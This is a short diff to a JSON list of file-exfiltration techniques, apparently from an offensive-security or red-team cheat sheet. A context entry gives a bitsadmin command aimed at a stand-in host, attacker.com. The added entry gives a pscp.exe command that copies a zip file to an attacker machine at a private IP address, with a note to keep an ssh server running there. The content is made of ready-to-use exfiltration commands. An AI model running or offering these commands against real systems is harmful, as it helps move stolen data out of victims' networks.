@@ -32,6 +32,12 @@
 			"name": "BITSAdmin Transfer",
 			"command": "bitsadmin /transfer exfilJob /download /priority normal http://attacker.com/upload C:\\temp\\data.zip C:\\temp\\null",
 			"description": "Abuse Background Intelligent Transfer Service."
+		},
+		{
+			"index": 5,
+			"name": "PSCP Transfer",
+			"command": "pscp.exe -pw yourpass .\\file.zip youruser@192.168.45.197:/home/kali/",
+			"description": "Transfer files using PuTTY SCP client https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html. Also make sure your ssh server is running on the attacker machine."
 		}
 	]
 }
